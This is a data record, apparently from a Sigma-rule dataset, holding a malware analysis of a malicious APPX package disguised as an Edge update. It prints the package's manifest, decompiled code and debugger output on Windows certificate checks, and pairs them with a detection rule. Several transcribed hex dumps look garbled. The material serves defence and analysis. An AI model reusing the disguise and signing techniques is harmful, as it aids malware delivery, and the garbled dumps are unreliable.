AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Potential Malicious AppX Package Installation Attempts",
      "id": "09d3b48b-be17-47f5-bf4e-94e7e75d09ce",
      "status": "test",
      "description": "Detects potential installation or installation attempts of known malicious appx packages",
      "references": [
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
        "https://forensicitguy.github.io/analyzing-magnitude-magniber-appx/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-01-12",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": [
            400,
            401
          ],
          "PackageFullName|contains": "3669e262-ec02-4e9d-bcb4-3d008b4afac9"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Rare occasions where a malicious package uses the exact same name and version as a legtimate application"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_mal_appx_names.yml",
    "id": "696"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block 